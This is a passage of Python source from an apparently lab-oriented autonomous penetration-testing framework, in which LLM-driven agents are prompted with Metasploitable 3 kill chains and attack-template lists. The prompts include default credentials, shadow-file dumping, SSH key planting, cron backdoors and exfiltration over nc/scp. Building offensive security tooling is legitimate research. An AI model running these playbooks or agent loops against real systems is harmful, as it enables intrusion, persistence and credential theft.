        _plan_str = ""
        if self._reasoning_plan:
            _plan_str = f"\nCurrent plan: {self._reasoning_plan[:100]}"
        
        # Phase 8.1: Team coordination context — what other agents found
        # Phase 42 fix: reuse _disc_board_src (which has fallback chain)
        # instead of only checking step_ctx.state.discovery_board
        _team_ctx = ""
        _disc_board = _disc_board_src  # Use the variable with full fallback chain
        if _disc_board:
            _team_ports = list(_disc_board.get('ports', set()))[:10]
            _team_services = list(_disc_board.get('services', set()))[:5]
            _team_creds = list(_disc_board.get('credentials', set()))[:3]
            _team_shells = list(_disc_board.get('shells', set()))[:2]
            if _team_ports or _team_services or _team_creds:
                _team_ctx = (f"\nTeam findings: ports={_team_ports}, "
                             f"services={_team_services}, creds={_team_creds}, "
                             f"shells={_team_shells}")
        
        # Phase 9: CognitiveBus context for mentor — unified timeline insights
        _cognitive_ctx = ""
        try:
            bus = self._get_cognitive_bus()
            if bus is not None:
                _cognitive_ctx = bus.get_mentor_context(
                    agent_id=self.agent_name,
                    phase=ctx.current_phase.name if ctx.current_phase else "",
                )
                if _cognitive_ctx:
                    _cognitive_ctx = f"\n{_cognitive_ctx}"
        except Exception:
            pass
        
        # Phase 11.3: Output interpretation lessons — teach agent to reason about output
        _output_learn_ctx = ""
        if self._output_lessons:
            _recent = self._output_lessons[-5:]  # Last 5 lessons
            _output_learn_ctx = (
                f"\nOUTPUT INTERPRETATION LESSONS (learned from previous commands):\n"
                + "\n".join(f"- {l}" for l in _recent)
            )
        if self._output_patterns_learned:
            _pats = self._output_patterns_learned[-8:]
            _output_learn_ctx += (
                f"\nLEARNED PATTERNS: {'; '.join(_pats)}"
            )
        
        # Phase 42: Determine target profile for knowledge gating
        _is_ms = ctx.target in ("172.28.0.10", "172.28.0.11") or "172.28.0" in ctx.target
        _disc_creds_str = "unknown"
        if ctx.state_flags.get('credentials_known'):
            _disc_creds = getattr(ctx, 'credentials', None) or set()
            if isinstance(_disc_creds, (set, list)) and _disc_creds:
                _disc_creds_str = ", ".join(str(c) for c in list(_disc_creds)[:3])
            elif _is_ms:
                _disc_creds_str = "msfadmin:msfadmin"
            else:
                _disc_creds_str = "discovered"

        _target_desc = "Metasploitable 3" if _is_ms else f"target {ctx.target}"
        
        compact_prompt = (
            f"You are a senior penetration tester coordinating a team of 5 agents "
            f"(Red=offense, Scout=recon, Shadow=stealth, Blue=defense, Orion=strategy) "
            f"attacking {_target_desc}.\n"
            f"Target: {ctx.target} | Phase: {ctx.current_phase.name} | "
            f"Ports: {', '.join(str(p) for p in list(_ports)[:10])} | "
            f"Services: {', '.join(str(s) for s in _services[:5])} | "
            f"Creds: {_disc_creds_str} | "
            f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'} | "
            f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'} | "
            f"UserFlag: {'YES' if ctx.state_flags.get('user_flag_captured') else 'NO'} | "
            f"RootFlag: {'YES' if ctx.state_flags.get('root_flag_captured') else 'NO'}"
            f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}{_cognitive_ctx}{_output_learn_ctx}\n"
        )

        # Only inject MS kill chains for Metasploitable targets
        if _is_ms:
            compact_prompt += (
                f"\nMS3 KILL CHAINS (proven paths — use these as attack playbooks):\n"
                f"1. SSH chain: nmap -sV -p22→ssh_login msfadmin:msfadmin→sudo su→cat /root/root.txt→exfil /etc/shadow\n"
                f"2. ProFTPD chain: nmap -sV -p21→ftp-anon→proftpd_exploit→reverse shell→sudo -l→privesc→cat flags→exfil\n"
                f"3. Samba chain: enum4linux -a→samba_exploit 445→shell→dump /etc/shadow→credential harvest→exfil\n"
                f"4. MySQL chain: mysql -h {ctx.target} -u root -psploitme→SELECT * FROM users→mysqldump→base64 exfil\n"
                f"5. Ingreslock chain: telnet {ctx.target} 1524→instant root→cat /root/root.txt→cat /etc/shadow→exfil\n"
                f"6. Tomcat chain: nmap -sV -p8180→default creds tomcat:tomcat→WAR deploy→reverse shell→privesc→flags\n"
                f"7. VNC chain: vncviewer {ctx.target}:5900 password='password'→desktop access→terminal→sudo su→flags\n"
                f"8. NFS chain: showmount -e {ctx.target}→mount -t nfs {ctx.target}:/ /mnt→plant SSH key→ssh root→flags\n"
            )

        compact_prompt += (
            f"\nEXPLOIT REASONING — Think step-by-step like a senior pentester:\n"
            f"- RECONNAISSANCE: What services are running? What versions? What attack surface is exposed?\n"
            f"- VULNERABILITY MAPPING: WHY is this service vulnerable? (default creds, backdoor, misconfig, CVE, unpatched)\n"
            f"- EXPLOIT SELECTION: Which exploit gives the fastest path to shell? Chain multiple if needed.\n"
            f"- PRIVILEGE ESCALATION: After initial shell → sudo -l, SUID binaries, kernel exploits, writable /etc/passwd, "
            f"cron jobs, world-readable NFS, backdoor ports (1524, 6200)\n"
            f"- FLAG CAPTURE: cat /home/*/user.txt (user flag), cat /root/root.txt (root flag) — ALWAYS do this before exfil\n"
            f"- EXFILTRATION: base64 /etc/shadow, mysqldump databases, copy sensitive files via nc/scp\n"
            f"- CHAIN LOGIC: Each action should BUILD on previous discoveries. Don't repeat failed commands.\n"
            f"- OUTPUT READING: Look for version numbers after '/', credentials in 'login:password' format, "
            f"open ports in 'STATE open', and error messages that reveal attack paths.\n"
            f"\nPlan 2-3 steps ahead. Suggest the NEXT logical action with specific tool/command.\n"
            f"Answer in 1-2 concrete sentences.\n"
            f"Question: {question}"
        )
        
        try:
            response = self.gpt_manager.gpt_request(
                compact_prompt,
                task_type="reasoning",
                agent_id=self.agent_name,
                max_tokens=410,  # Phase 11.5: +50% (was 273) for ultra-deep mentor→apprentice reasoning
                model="local-llm",
            )
            if response:
                logger.info(
                    f"[MENTOR-REASONING] {self.agent_name}: Q={question[:60]} → "
                    f"A={response[:100]}"
                )
                # Phase 10.3: Log reasoning for dashboard
                self._step_reasoning_log.append({
                    "type": "mentor_reason",
                    "agent": self.agent_name,
                    "message": f"Q={question[:40]} → A={response[:80]}",
                })
                # Phase 8.0: Store reasoning as hypothesis/plan for context
                clean = response.strip()
                if "should" in clean.lower() or "try" in clean.lower() or "use" in clean.lower():
                    self._reasoning_plan = clean[:200]
                self._reasoning_hypotheses.append(clean[:100])
                if len(self._reasoning_hypotheses) > 5:
                    self._reasoning_hypotheses = self._reasoning_hypotheses[-5:]
                # Phase 11.0: Record this LLM call in budget controller
                if self.budget_controller is not None:
                    self.budget_controller.record_mentor_call(tokens_used=150)
                return clean
        except Exception as e:
            logger.debug(f"Mentor reasoning check failed: {e}")
        
        return None

    # -----------------------------------------------------------------
    # Phase 11.3: Output Interpretation Learning Interface
    # -----------------------------------------------------------------

    def record_interpretation_lesson(self, lesson_context: str) -> None:
        """Record an output interpretation lesson from the LLM interpreter.
        
        These lessons teach the agent HOW to read command output:
        what patterns indicate success, where to find credentials,
        how to recognize new attack surfaces, etc.
        
        Args:
            lesson_context: Compact lesson string from InterpretationLesson.to_learning_context()
        """
        if not lesson_context or not lesson_context.strip():
            return
        self._output_lessons.append(lesson_context.strip()[:300])
        if len(self._output_lessons) > self._max_output_lessons:
            self._output_lessons = self._output_lessons[-self._max_output_lessons:]
        logger.debug(
            f"[{self.agent_name}] Recorded output lesson ({len(self._output_lessons)} total)"
        )

    def inject_output_patterns(self, patterns: List[str]) -> None:
        """Inject learned output-reading patterns from the LLM interpreter.
        
        These are cross-episode patterns the interpreter has observed,
        e.g. 'nmap -sV shows version after slash', 'hydra reports [port][service] host login: password'.
        
        Args:
            patterns: List of pattern description strings
        """
        for p in patterns:
            if p and p.strip() and p not in self._output_patterns_learned:
                self._output_patterns_learned.append(p.strip()[:200])
        # Cap total
        if len(self._output_patterns_learned) > 75:  # Phase 11.5: +50% (was 50)
            self._output_patterns_learned = self._output_patterns_learned[-75:]

    # =====================================================================
    # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
    # =====================================================================

    # R60: Phase-compatible template recommendations for Codex Meta.
    # Maps phase → list of high-value template_names the Codex can recommend.
    # These are all KNOWN templates in the registry, so PHASE-GATE will recognize them.
    _CODEX_PHASE_TEMPLATES = {
        AttackPhase.EXPLOITATION: [
            "ssh_login", "msfconsole_exploit", "msfconsole_auto", "mysql_login",
            "mssql_login", "vsftpd_exploit", "sqlmap_get", "sqlmap_shell",
            "nfs_mount", "hydra_ssh", "hydra_ftp", "hydra_smb",
            "impacket_psexec", "evil_winrm", "msfvenom_payload",
            "crackmapexec_smb_bruteforce", "ssh_key_login",
        ],
        AttackPhase.PRIVILEGE_ESCALATION: [
            "sudo_list", "find_suid", "find_capabilities", "linpeas",
            "kernel_exploit_check", "find_writable_etc", "sudo_check",
            "find_sgid", "cron_check", "writable_etc_passwd",
            "capability_check", "docker_privesc", "lxd_privesc",
            "pspy_monitor", "ssh_key_plant",
        ],
        AttackPhase.LATERAL_MOVEMENT: [
            "ssh_lateral", "ssh_tunnel_local", "ssh_tunnel_dynamic",
            "pivot_scan", "nmap_pivot", "proxychains_scan",
            "chisel_client", "impacket_pth_psexec", "crackmapexec_pth",
        ],
        AttackPhase.POST_EXPLOITATION: [
            "credential_dump", "hashdump", "dump_shadow", "dump_passwd",
            "history_dump", "network_config_dump", "ssh_key_harvest",
            "plant_ssh_key", "cron_backdoor", "impacket_secretsdump",
        ],
        AttackPhase.ENUMERATION: [
            "gobuster_dir", "nikto_scan", "enum4linux_full",
            "smbclient_list", "smbmap_shares", "snmpwalk",
            "showmount", "rpcclient_null", "ftp_anonymous",
            "nuclei_scan", "wpscan", "searchsploit",
        ],
    }

    def _codex_meta_check(
        self,
        step_ctx: SmartStepContext,
        current_phase: AttackPhase,
        filtered_commands: List[CommandTemplate],
    ) -> Optional[SmartDecisionResult]:
        """
        Layer 3: Codex Meta-Layer — Strategic stagnation-breaking with local-llm.

        R60 UPGRADE: Now outputs phase-compatible template_names instead of raw
        commands. Codex returns JSON with recommended_template that maps to the
        command registry, ensuring PHASE-GATE sees a valid phase-compatible command.

        Trigger conditions (R60 — more permissive):
            1. Stagnation: EXPLOITATION ≥8, PRIV_ESC ≥4, LATERAL ≥5, ENUM ≥10
            2. Anti-repeat spike: 3+ anti-repeat hits within last 5 steps
            3. PHASE-GATE override storm: 3+ gate overrides in last 5 steps

        Budget: 5 calls/episode, 2-step cooldown between calls.
        Only fires for offensive agents (RedAgent is the primary learner).
        """
        # Budget check — R67: adaptive budget boost when velocity stalls
        _effective_budget = self._codex_meta_max_per_episode + self._r67_codex_bonus_budget
        if self._codex_meta_calls_episode >= _effective_budget:
            return None
        
        # Phase 11.0: Centralized budget gate for codex meta calls
        if self.budget_controller is not None:
            _pname = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
            _stag = getattr(self, '_stagnation_steps', 0)
            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                logger.debug(f"[{self.agent_name}] Codex meta suppressed by budget gate")
                return None

        # R67: Grant bonus codex budget when reward velocity is stalling
        if self._r67_stalling and self._r67_codex_bonus_budget < 3:
            self._r67_codex_bonus_budget += 1
            logger.info(
                f"[CODEX-META][{self.agent_name}] R67 velocity stall → "
                f"bonus budget +1 (now {_effective_budget + 1})"
            )

        # Cooldown check
        if self._codex_meta_cooldown > 0:
            self._codex_meta_cooldown -= 1
            return None

        # Track steps in current phase (independent of _stagnation_steps)
        if current_phase != self._codex_meta_last_phase:
            self._codex_meta_phase_steps = 0
            self._codex_meta_last_phase = current_phase
        self._codex_meta_phase_steps += 1

        # Phase-specific stagnation thresholds (R60: lowered)
        _CODEX_THRESHOLDS = {
            AttackPhase.EXPLOITATION: 8,
            AttackPhase.PRIVILEGE_ESCALATION: 4,
            AttackPhase.LATERAL_MOVEMENT: 5,
            AttackPhase.ENUMERATION: 10,
            AttackPhase.POST_EXPLOITATION: 6,
        }
        threshold = _CODEX_THRESHOLDS.get(current_phase, 12)

        # R60: Multiple trigger conditions (any one sufficient)
        # Phase 52: Repeat every 6 steps (was 4) — with only 2 budget, be selective
        _stagnation_trigger = (
            self._codex_meta_phase_steps >= threshold
            and (self._codex_meta_phase_steps - threshold) % 6 == 0
        )
        _antirepeat_spike = self._codex_meta_antirepeat_hits >= 4  # Phase 52: 3→4
        _gate_storm = self._codex_meta_gate_overrides >= 4         # Phase 52: 3→4
        # R67: Reward velocity stall trigger
        _velocity_stall = self._r67_stalling and self._codex_meta_phase_steps >= 3

        if not (_stagnation_trigger or _antirepeat_spike or _gate_storm or _velocity_stall):
            return None

        # Reset spike counters on trigger
        if _antirepeat_spike:
            self._codex_meta_antirepeat_hits = 0
        if _gate_storm:
            self._codex_meta_gate_overrides = 0

        # Only for offensive agents (Red is the primary attack learner)
        if self.agent_role.get("role") != "offensive":
            return None

        # GPT must be available
        if self.gpt_manager is None or self.gpt_manager.is_offline():
            return None

        # Build strategic context from discovery board and attack context
        ctx = step_ctx.attack_context
        discovery_board = step_ctx.state.get("discovery_board", {})
        recent_cmds = (ctx.command_history or [])[-8:]

        _ports = sorted(list(discovery_board.get("ports", set())))[:15]
        _services = sorted(list(discovery_board.get("services", set())))[:10]
        _creds = list(discovery_board.get("credentials", set()))[:5]
        _shells = list(discovery_board.get("shells", set()))[:3]

        # Include best chain from cross-episode memory for context
        _chain_hint = ""
        if self._best_chain:
            _best_cmds = self._best_chain.get("commands", [])[:5]
            _chain_hint = (
                f"\nBest attack chain from past episodes (reward={self._best_chain.get('reward', 0):.0f}): "
                + " → ".join(_best_cmds)
            )

        # R60: Build list of valid templates for current phase
        valid_templates = self._CODEX_PHASE_TEMPLATES.get(current_phase, [])
        # Also include templates from adjacent phase (+1)
        _next_phase_order = self.PHASE_ORDER.get(current_phase, 0) + 1
        for phase, order in self.PHASE_ORDER.items():
            if order == _next_phase_order:
                valid_templates = valid_templates + self._CODEX_PHASE_TEMPLATES.get(phase, [])
                break

        # Determine trigger reason for the prompt
        _trigger_reason = "stagnation"
        if _antirepeat_spike:
            _trigger_reason = "anti-repeat spike (3+ blocked commands in 5 steps)"
        elif _gate_storm:
            _trigger_reason = "phase-gate override storm (3+ overrides in 5 steps)"
        elif _velocity_stall:
            _trigger_reason = f"reward velocity stall (v={self._r67_velocity:.1f})"

        # ─── Phase 8: Try persona router (tactical) first ──────────
        # Persona router has registry-validated outputs — faster and cleaner.
        # Falls through to raw GPT prompt if persona call fails/unavailable.
        if self.persona_router is not None:
            try:
                persona_result = self.persona_router.query_tactical(
                    phase=current_phase.name,
                    target=ctx.target,
                    state_flags=dict(ctx.state_flags),
                    recent_commands=recent_cmds,
                    discoveries=discovery_board,
                    agent_name=self.agent_name,
                )
                if (persona_result.success
                        and persona_result.template_name
                        and persona_result.template_name not in self._codex_meta_used_templates):
                    _p_template = COMMAND_REGISTRY.get(persona_result.template_name)
                    if _p_template is not None:
                        params = {"target": ctx.target}
                        for param in _p_template.required_params:
                            if param not in params:
                                params[param] = self._get_default_param(param, ctx)
                        command = render_command(_p_template, params)
                        
                        self._codex_meta_calls_episode += 1
                        self._codex_meta_cooldown = 2
                        self._codex_meta_used_templates.add(persona_result.template_name)
                        
                        logger.info(
                            f"[PERSONA-TACTICAL][{self.agent_name}] "
                            f"template={persona_result.template_name} "
                            f"trigger={_trigger_reason}"
                        )
                        
                        return SmartDecisionResult(
                            command=command,
                            source="codex_meta",
                            confidence=persona_result.confidence,
                            template_name=persona_result.template_name,
                            params=params,
                            reasoning=(
                                f"[PERSONA-TACTICAL] {_trigger_reason}: "
                                f"{persona_result.reasoning[:100]}"
                            ),
                            mentor_call=True,
                            model_used="persona:tactical",
                            mentor_reasoning=(
                                f"[PERSONA-TACTICAL] {persona_result.template_name}. "
                                f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
                            ),
                            phase=current_phase,
                        )
            except Exception as e:
                logger.debug(f"[PERSONA-TACTICAL] Failed, falling through to raw GPT: {e}")

        # Phase 9: CognitiveBus codex context for tactical analysis
        _codex_ctx = ""
        try:
            bus = self._get_cognitive_bus()
            if bus is not None:
                _codex_ctx = bus.get_codex_context(
                    agent_id=self.agent_name,
                    persona="tactical",
                    phase=current_phase.name,
                )
                if _codex_ctx:
                    _codex_ctx = f"\n{_codex_ctx}\n"
        except Exception:
            pass

        prompt = (
            f"TACTICAL STAGNATION ANALYSIS — Phase: {current_phase.name}\n"
            f"Trigger: {_trigger_reason}. Steps in phase: {self._codex_meta_phase_steps}.\n"
            f"Target: {ctx.target}\n"
            f"Coherence: {self._r66_coherence:.2f}  Macro confidence: {self._r66_macro_conf:.2f}\n"
            f"Reward velocity: {self._r67_velocity:.1f}  Stalling: {self._r67_stalling}\n"
            f"{_codex_ctx}\n"
            f"Current state:\n"
            f"- Ports discovered: {_ports}\n"
            f"- Services: {_services}\n"
            f"- Credentials: {_creds if _creds else 'none discovered yet'}\n"
            f"- Shells: {_shells}\n"
            f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
            f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}, "
            f"creds={'YES' if ctx.state_flags.get('credentials_known') else 'NO'}, "
            f"hash={'YES' if ctx.state_flags.get('hash_known') else 'NO'}, "
            f"user_flag={'YES' if ctx.state_flags.get('user_flag_captured') else 'NO'}, "
            f"root_flag={'YES' if ctx.state_flags.get('root_flag_captured') else 'NO'}\n"
            f"- GOALS: If shell obtained → read user flag (cat /home/*/user.txt). "
            f"If root shell → read root flag (cat /root/root.txt). "
            f"Flags are HIGH VALUE targets.\n\n"
            f"Recent commands tried (all failed to advance):\n"
            + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
            + f"{_chain_hint}\n\n"
            f"AVAILABLE TEMPLATES for {current_phase.name} (choose from these):\n"
            + ", ".join(t for t in valid_templates[:20] if t not in self._codex_meta_used_templates)
            + (f"\n\nALREADY USED THIS EPISODE (DO NOT repeat): {', '.join(self._codex_meta_used_templates)}" if self._codex_meta_used_templates else "")
            + f"\n\nRespond with ONLY a JSON object (no markdown, no backticks):\n"
            '{"recommended_template": "template_name", "reason": "brief why", '
            '"blocked_families": ["families_to_avoid"], "confidence": 0.8}\n'
            f"Pick the single best NEW template to break stagnation in {current_phase.name}."
        )

        try:
            response = self.gpt_manager.gpt_request(
                prompt=prompt,
                task_type="strategic",  # Routes to local-llm
                agent_id=self.agent_name,
                max_tokens=390,  # Phase 11.5: +50% (was 260) for ultra-rich mentor guidance
            )

            if not response or not isinstance(response, str) or len(response.strip()) < 5:
                return None

            # R60: Parse JSON response and map to template
            _chosen_template_name = None
            _codex_reason = ""
            _codex_confidence = 0.80

            # Try JSON parse first
            try:
                import json as _json
                # Strip markdown code fences if present
                _clean = response.strip()
                if _clean.startswith("```"):
                    _clean = _clean.split("\n", 1)[-1].rsplit("```", 1)[0].strip()
                _parsed = _json.loads(_clean)
                _chosen_template_name = _parsed.get("recommended_template")
                _codex_reason = _parsed.get("reason", "")[:120]
                _codex_confidence = min(0.95, max(0.5, float(_parsed.get("confidence", 0.8))))
            except (ValueError, TypeError, KeyError):
                # Fallback: treat response as a template name directly
                _candidate = response.strip().split("\n")[0].strip().strip('"').strip("'")
                # Remove common LLM artifacts
                for prefix in ("template:", "recommended_template:", "> "):
                    if _candidate.lower().startswith(prefix):
                        _candidate = _candidate[len(prefix):].strip()
                _chosen_template_name = _candidate
                _codex_reason = "raw-response-fallback"

            if not _chosen_template_name:
                logger.debug(f"[CODEX-META] No template in response: {response[:80]}")
                return None

            # Look up template in registry
            _template = COMMAND_REGISTRY.get(_chosen_template_name)

            # R60: If exact match fails, try fuzzy match within valid templates
            if _template is None:
                _name_lower = _chosen_template_name.lower().replace("-", "_")
                for vt in valid_templates:
                    if vt.lower() == _name_lower or _name_lower in vt.lower():
                        _template = COMMAND_REGISTRY.get(vt)
                        if _template:
                            _chosen_template_name = vt
                            break

            # If still not found, fall back to a random phase-appropriate template
            if _template is None:
                logger.info(
                    f"[CODEX-META][{self.agent_name}] Template '{_chosen_template_name}' "
                    f"not found in registry. Falling back to phase-appropriate random."
                )
                _phase_templates = [
                    COMMAND_REGISTRY.get(t) for t in valid_templates
                    if COMMAND_REGISTRY.get(t) is not None
                ]
                if _phase_templates:
                    _template = random.choice(_phase_templates)
                    _chosen_template_name = _template.name if _template else ""
                    _codex_reason = f"codex-fallback: {_codex_reason}"
                else:
                    return None

            # Render the command from the template
            assert _template is not None  # guaranteed by above guard
            params = {"target": ctx.target}
            for param in _template.required_params:
                if param not in params:
                    params[param] = self._get_default_param(param, ctx)
            command = render_command(_template, params)

            self._codex_meta_calls_episode += 1
            # R62: Track used template for dedup; adaptive cooldown
            if _chosen_template_name in self._codex_meta_used_templates:
                self._codex_meta_cooldown = 4  # Repeat → longer cooldown
            else:
                self._codex_meta_cooldown = 2  # New template → normal cooldown
            self._codex_meta_used_templates.add(_chosen_template_name)

            logger.info(
                f"[CODEX-META][{self.agent_name}] Stagnation break at "
                f"{current_phase.name} step {self._codex_meta_phase_steps}: "
                f"template={_chosen_template_name} reason={_codex_reason[:60]} "
                f"trigger={_trigger_reason[:30]}"
            )

            # R68: Force PPO to use a different phase-head on next step
            # When codex breaks stagnation, nudge PPO to think from a
            # different phase perspective for diversity
            _PHASE_TO_GROUP = {
                AttackPhase.RECON: 0, AttackPhase.ENUMERATION: 0,
                AttackPhase.EXPLOITATION: 1, AttackPhase.PRIVILEGE_ESCALATION: 1,
                AttackPhase.LATERAL_MOVEMENT: 2, AttackPhase.POST_EXPLOITATION: 2,
                AttackPhase.EXFILTRATION: 2, AttackPhase.CLOSEOUT: 2,
            }
            _current_group = _PHASE_TO_GROUP.get(current_phase, 0)
            # Rotate to next group (0→1→2→0) for diversity
            self._r68_forced_phase_group = (_current_group + 1) % 3
            logger.debug(
                f"[R68-CODEX][{self.agent_name}] Forcing next PPO phase_group="
                f"{self._r68_forced_phase_group} (was {_current_group})"
            )

            result = SmartDecisionResult(
                command=command,
                source="codex_meta",
                confidence=_codex_confidence,
                template_name=_chosen_template_name,  # R60: Now set! PHASE-GATE sees valid template
                params=params,
                reasoning=(
                    f"[CODEX-META] {_trigger_reason}: "
                    f"{self._codex_meta_phase_steps} steps in {current_phase.name}. "
                    f"Template={_chosen_template_name}. {_codex_reason}"
                ),
                mentor_call=True,
                model_used="local-llm",
                mentor_reasoning=(
                    f"[CODEX-META] Strategic override → {_chosen_template_name} "
                    f"({current_phase.name} step {self._codex_meta_phase_steps}). "
                    f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
                ),
                phase=current_phase,
            )
            return result
        except Exception as e:
            logger.debug(f"[CODEX-META][{self.agent_name}] Call failed: {e}")

        return None

    def _codex_strategic_check(
        self,
        step_ctx: SmartStepContext,
        current_phase: AttackPhase,
        filtered_commands: List[CommandTemplate],
    ) -> Optional[SmartDecisionResult]:
        """
        R66 Layer 3b: Codex Strategic — Episode-level plan repair.

        Fires when overall episode progress is poor:
          - Step ≥ 15 and still in RECON/ENUMERATION
          - Coherence collapsing (<0.30 for 3+ steps)
          - Step ≥ 25 and not yet reached POST_EXPLOITATION

        Separate budget from codex_tactical (3 calls/episode, 3-step cooldown).
        Uses a broader prompt asking for a multi-step attack plan.
        """
        if self._codex_strategic_calls_episode >= self._codex_strategic_max_per_episode:
            return None
        if self._codex_strategic_cooldown > 0:
            self._codex_strategic_cooldown -= 1
            return None
        # Only for offensive agents
        if self.agent_role.get("role") != "offensive":
            return None
        if self.gpt_manager is None or self.gpt_manager.is_offline():
            return None
        
        # Phase 11.0: Centralized budget gate for codex strategic calls
        if self.budget_controller is not None:
            _pname = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
            _stag = getattr(self, '_stagnation_steps', 0)
            if not self.budget_controller.can_call_mentor(_pname, stagnation_steps=_stag):
                logger.debug(f"[{self.agent_name}] Codex strategic suppressed by budget gate")
                return None

        step_num = step_ctx.step
        _coherence = self._r66_coherence
        _phase_order = self.PHASE_ORDER.get(current_phase, 0)

        # Trigger conditions
        _early_stuck = (step_num >= 15 and _phase_order <= 1)  # RECON/ENUM at step 15+
        _late_stuck = (step_num >= 25 and _phase_order < 5)  # not POST_EXPLOITATION by step 25
        _coherence_collapse = (_coherence < 0.30)

        if not (_early_stuck or _late_stuck or _coherence_collapse):
            return None

        ctx = step_ctx.attack_context
        discovery_board = step_ctx.state.get("discovery_board", {})
        recent_cmds = (ctx.command_history or [])[-10:]
        _ports = sorted(list(discovery_board.get("ports", set())))[:15]
        _services = sorted(list(discovery_board.get("services", set())))[:10]
        _creds = list(discovery_board.get("credentials", set()))[:5]
        _shells = list(discovery_board.get("shells", set()))[:3]

        _trigger = "early_stuck" if _early_stuck else ("late_stuck" if _late_stuck else "coherence_collapse")

        # ─── Phase 8: Try persona router (strategic) first ──────────
        if self.persona_router is not None:
            try:
                persona_result = self.persona_router.query_strategic(
                    phase=current_phase.name,
                    target=ctx.target,
                    state_flags=dict(ctx.state_flags),
                    discoveries=discovery_board,
                    episode_history=recent_cmds,
                    agent_name=self.agent_name,
                )
                if (persona_result.success
                        and persona_result.template_name
                        and persona_result.template_name not in self._codex_meta_used_templates):
                    _p_template = COMMAND_REGISTRY.get(persona_result.template_name)
                    if _p_template is not None:
                        params = {"target": ctx.target}
                        for param in _p_template.required_params:
                            if param not in params:
                                params[param] = self._get_default_param(param, ctx)
                        command = render_command(_p_template, params)
                        
                        self._codex_strategic_calls_episode += 1
                        self._codex_strategic_cooldown = 3
                        self._codex_meta_used_templates.add(persona_result.template_name)
                        
                        logger.info(
                            f"[PERSONA-STRATEGIC][{self.agent_name}] "
                            f"template={persona_result.template_name} "
                            f"trigger={_trigger}"
                        )
                        
                        return SmartDecisionResult(
                            command=command,
                            source="codex_meta",
                            confidence=persona_result.confidence,
                            template_name=persona_result.template_name,
                            params=params,
                            reasoning=(
                                f"[PERSONA-STRATEGIC] {_trigger}: step {step_num}. "
                                f"{persona_result.reasoning[:100]}"
                            ),
                            mentor_call=True,
                            model_used="persona:strategic",
                            mentor_reasoning=(
                                f"[PERSONA-STRATEGIC] Plan repair → {persona_result.template_name}. "
                                f"Call {self._codex_strategic_calls_episode}/{self._codex_strategic_max_per_episode}"
                            ),
                            phase=current_phase,
                        )
            except Exception as e:
                logger.debug(f"[PERSONA-STRATEGIC] Failed, falling through to raw GPT: {e}")

        # Phase 9: CognitiveBus codex context for strategic plan repair
        _codex_strat_ctx = ""
        try:
            bus = self._get_cognitive_bus()
            if bus is not None:
                _codex_strat_ctx = bus.get_codex_context(
                    agent_id=self.agent_name,
                    persona="strategic",
                    phase=current_phase.name,
                )
                if _codex_strat_ctx:
                    _codex_strat_ctx = f"\n{_codex_strat_ctx}\n"
        except Exception:
            pass

        prompt = (
            f"STRATEGIC PLAN REPAIR — Episode step {step_num}, Phase: {current_phase.name}\n"
            f"Trigger: {_trigger}. Coherence: {_coherence:.2f}. Macro conf: {self._r66_macro_conf:.2f}\n"
            f"Target: {ctx.target}\n"
            f"{_codex_strat_ctx}\n"
            f"Current state:\n"
            f"- Ports: {_ports}\n- Services: {_services}\n"
            f"- Credentials: {_creds if _creds else 'none discovered yet'}\n"
            f"- Shells: {_shells}\n"
            f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
            f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}\n\n"
            f"Recent commands (last 10):\n"
            + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
            + f"\n\nWe are falling behind. Provide a 3-step attack plan to reach CLOSEOUT.\n"
            f"For each step, name the template_name from the command registry.\n"
            f"Respond with ONLY a JSON object (no markdown):\n"
            '{"plan": [{"template": "name1", "reason": "why"}, '
            '{"template": "name2", "reason": "why"}, '
            '{"template": "name3", "reason": "why"}], "confidence": 0.8}\n'
        )

        try:
            response = self.gpt_manager.gpt_request(
                prompt=prompt,
                task_type="strategic",
                agent_id=self.agent_name,
                max_tokens=585,  # Phase 11.5: +50% (was 390) for ultra-deep mentor planning
            )
            if not response or not isinstance(response, str) or len(response.strip()) < 5:
                return None

            import json as _json
            _clean = response.strip()
            if _clean.startswith("```"):
                _clean = _clean.split("\n", 1)[-1].rsplit("```", 1)[0].strip()
            _parsed = _json.loads(_clean)
            _plan = _parsed.get("plan", [])
            _codex_conf = min(0.95, max(0.5, float(_parsed.get("confidence", 0.8))))

            if not _plan:
                return None

            # Use the FIRST template from the plan
            _chosen_name = _plan[0].get("template", "")
            _reason = _plan[0].get("reason", "")[:100]

            # Look up in registry
            _template = COMMAND_REGISTRY.get(_chosen_name)
            if _template is None:
                # Fuzzy match
                _name_lower = _chosen_name.lower().replace("-", "_")
                for vt_name, vt in COMMAND_REGISTRY.items():
                    if vt_name.lower() == _name_lower or _name_lower in vt_name.lower():
                        _template = vt
                        _chosen_name = vt_name
                        break
            if _template is None:
                # Fallback to a random phase-appropriate template
                valid_templates = self._CODEX_PHASE_TEMPLATES.get(current_phase, [])
                _phase_templates = [
                    COMMAND_REGISTRY.get(t) for t in valid_templates
                    if COMMAND_REGISTRY.get(t) is not None
                ]
                if _phase_templates:
                    import random
                    _template = random.choice(_phase_templates)
                    _chosen_name = _template.name if _template else ""
                    _reason = f"strategic-fallback: {_reason}"
                else:
                    return None

            assert _template is not None  # guaranteed by above guard
            params = {"target": ctx.target}
            for param in _template.required_params:
                if param not in params:
                    params[param] = self._get_default_param(param, ctx)
            command = render_command(_template, params)

            self._codex_strategic_calls_episode += 1
            self._codex_strategic_cooldown = 3
            self._codex_meta_used_templates.add(_chosen_name)  # shared dedup

            logger.info(
                f"[CODEX-STRATEGIC][{self.agent_name}] Plan repair at step {step_num}: "
                f"template={_chosen_name} trigger={_trigger} plan_depth={len(_plan)}"
            )

            result = SmartDecisionResult(
                command=command,
                source="codex_meta",  # Keep source compatible with metrics
